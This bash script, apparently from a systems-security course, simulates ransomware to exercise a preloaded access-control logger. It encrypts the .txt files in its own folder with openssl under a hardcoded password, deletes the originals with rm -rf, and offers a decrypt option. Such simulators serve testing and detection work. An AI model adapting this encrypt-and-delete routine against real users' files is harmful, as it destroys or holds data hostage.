#!/bin/bash


#-------- LIST OF FUNCTIONS -----------------
function usage(){
    printf "Usage: \n"
    printf "./ransomware.sh -n <number_of_files> \n"
    printf "\tOR\n"
    printf "./ransomware.sh -e (or) -d  \n\n"
    printf "Options: \n"
    printf -- "-n,  --files     Creates <number_of_files> files in <directory>\n"
    printf -- "-e,  --encrypt   Encrypts everything in given <directory> using <password>\n"
    printf -- "-d,  --decrypt   Decrypts everything in given <directory> using <password>\n"
    printf -- "-h,  --help      This help message\n\n"
    printf -- "WARNING: This is a test tool, be careful though.\n"
    exit
}

function create_files(){
	## get in the default directory:
	dir="$(dirname "$(readlink -f "$0")")"
	files="$dir/*.txt"
	for file in $files
	do
		let "filenum=filenum+1"		#to create (existed)+ filenum files
	done
	./test_aclog $filenum
	
	exit 
}

function encrypt(){
	#in case it breaks, exit: 
	shopt -s nullglob 
	#assign as array:
	dir="$(dirname "$(readlink -f "$0")")"
	files="$dir/*.txt"	
	#encrypt files:
	for file in $files
	do		
		openssl aes-256-cbc -e -a -iter 1000 -in ${file} -out ${file}.encrypt -k 1234
		rm -rf "$file"
	done
	exit
}

function decrypt(){
	#in case it breaks, exit: 
	shopt -s nullglob 
	#assign as array:
	dir="$(dirname "$(readlink -f "$0")")"
	files="$dir/*.encrypt"
    for file in $files
	do 	   			
    	#remove ".encrypt" suffix from the end and decrypt:
        openssl aes-256-cbc -d -a -iter 1000 -in $file -out ${file%.encrypt} -k 1234 # decrypt
        rm -rf ${file}     
    done
    exit 
}
#----------------------------------------------------------------------------

export LD_PRELOAD=~/Desktop/COURSES/Systems_Security/Assigns_2021/Assignments/mine/Assignment5/logger.so

## --------- MAIN --------------------
while ! [[ -z $1 ]]
do
	if [[ $1 == '-h' ]]
	then
		tput setaf 2; 
		usage 
        tput sgr0;
	elif [[ $1 == '-e' ]] 
	then
		encrypt
	elif [[ $1 == '-d' ]]  
	then
		decrypt
	elif [[ $1 == '-n' ]] 
	then
		filenum=$2
		create_files
	fi
	shift
done 